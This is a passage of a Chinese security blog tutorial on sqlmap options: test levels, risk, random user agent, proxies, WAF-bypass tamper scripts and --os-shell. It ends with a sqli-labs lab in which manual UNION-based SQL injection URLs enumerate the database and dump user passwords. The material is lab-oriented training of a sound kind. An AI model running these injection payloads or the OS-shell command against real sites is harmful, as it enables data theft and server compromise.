+<h2 id="10-测试等级"><a href="#10-测试等级" class="headerlink" title="10  测试等级"></a>10  测试等级</h2><h3 id="–level"><a href="#–level" class="headerlink" title="–level"></a>–level</h3><pre><code class="hljs plain">--level
+--level 1 默认，测试GET参数或POST参数
+--level 2 在level1的基础上，测试Cookie注入
+--level 3 在level2的基础上，测试UA、referer 等常见请求头注入
+--level 4/5 完整检测、检测所有的请求头</code></pre>
+
+<h2 id="11-风险等级"><a href="#11-风险等级" class="headerlink" title="11  风险等级"></a>11  风险等级</h2><h3 id="–risk"><a href="#–risk" class="headerlink" title="–risk"></a>–risk</h3><pre><code class="hljs plain">--risk
+--risk 1 默认
+--risk 2 有风险的测试，会大量使用 or 和 sleep
+--risk 3 大量测试 delete 、 insert 、update 的注入</code></pre>
+
+<h2 id="12-随机UA"><a href="#12-随机UA" class="headerlink" title="12  随机UA"></a>12  随机UA</h2><h3 id="–random-agent"><a href="#–random-agent" class="headerlink" title="–random-agent"></a>–random-agent</h3><p>默认的sqlmap 请求头的 User-agent 中会携带 sqlmap 的特征和版本号</p>
+<pre><code class="hljs plain">python sqlmap.py -u &quot;http://192.168.2.50:8081/vulnerabilities/sqli/?
+id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=fooj3nvc6qfm09kb88knsol3a5;
+security=low&quot; --dbs --flush-session --random-agent</code></pre>
+
+<h2 id="13-代理"><a href="#13-代理" class="headerlink" title="13 代理"></a>13 代理</h2><h3 id="–proxy"><a href="#–proxy" class="headerlink" title="–proxy"></a>–proxy</h3><pre><code class="hljs plain">python sqlmap.py -u &quot;https://www.google.com&quot; --proxy=socks5://127.0.0.1:7897</code></pre>
+
+<h2 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h2><h3 id="1-指定前缀-闭合"><a href="#1-指定前缀-闭合" class="headerlink" title="1  指定前缀(闭合)"></a>1  指定前缀(闭合)</h3><h4 id="–prefix"><a href="#–prefix" class="headerlink" title="–prefix"></a>–prefix</h4><pre><code class="hljs plain">--prefix
+--prefix=&quot;&#x27;&quot; 指定闭合为 &#x27;
+--prefix=&#x27;&quot;)&#x27; 指定闭合为 &quot;)</code></pre>
+
+<h3 id="2-指定后缀-（注释）"><a href="#2-指定后缀-（注释）" class="headerlink" title="2  指定后缀 （注释）"></a>2  指定后缀 （注释）</h3><h4 id="–suffix"><a href="#–suffix" class="headerlink" title="–suffix"></a>–suffix</h4><pre><code class="hljs plain">--suffix
+--suffix=&#x27;-- &#x27; 指定后缀为--空格</code></pre>
+
+<h3 id="3-绕过waf"><a href="#3-绕过waf" class="headerlink" title="3  绕过waf"></a>3  绕过waf</h3><h4 id="–tamper-脚本名"><a href="#–tamper-脚本名" class="headerlink" title="–tamper 脚本名"></a>–tamper 脚本名</h4><h3 id="4-获取系统命令行权限-getshell"><a href="#4-获取系统命令行权限-getshell" class="headerlink" title="4  获取系统命令行权限 getshell"></a>4  获取系统命令行权限 getshell</h3><p>大部分情况都会失败</p>
+<h4 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h4><pre><code class="hljs plain">python sqlmap.py -u &quot;http://192.168.79.120:81/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;  -batch --os-shell</code></pre>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><pre><code class="hljs plain">-g GOOGLEDORK 谷歌黑客语法
+--auth-type 指定认证方式，如http basic
+--tor tor洋葱网络</code></pre>
+
+<h2 id="靶场：-sqlilabs"><a href="#靶场：-sqlilabs" class="headerlink" title="靶场： sqlilabs"></a>靶场： sqlilabs</h2><p>docker 搭建</p>
+<pre><code class="hljs plain">docker run -d -p 8082:80 --name sqlilabs acgpiano/sqli-labs</code></pre>
+
+<p>安装数据库</p>
+<p>判断是否有SQL注入</p>
+<p>有哪些数据库</p>
+<p>判断当前数据库名</p>
+<p>判断当前用户</p>
+<p>–is-dba : 判断当前数据库用户是否为管理员</p>
+<p>判断数据库中的表名</p>
+<p>判断数据库中的表的列名</p>
+<p>找列中的数据</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=1%27">http://192.168.79.120:8082/Less-1/?id=</a>1’</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=1%27">http://192.168.79.120:8082/Less-1/?id=1&#39;</a> and 1&#x3D;1 – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> order by 4 – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> order by 3 – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(schema_name) from information_schema.schemata – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,2,database() – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,2,user() – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name) ,2 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.120:8082/Less-1/?id=-1%27">http://192.168.79.120:8082/Less-1/?id=-1&#39;</a> union select 1,group_concat(password) ,2 from security.users – -</p>
+
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span>SQL注入</span></a>
+          
+            <a href="/tags/SQLMap/"><span>SQLMap</span></a>
+          
+            <a href="/tags/%E5%B7%A5%E5%85%B7/"><span>工具</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/sql-injection-defense/">
+            <span>← 上一篇</span>
+            <strong>SQL 注入防御方案与利用进阶</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/sql-injection-basics/">
+            <span>下一篇 →</span>
+            <strong>SQL 注入漏洞原理与利用</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
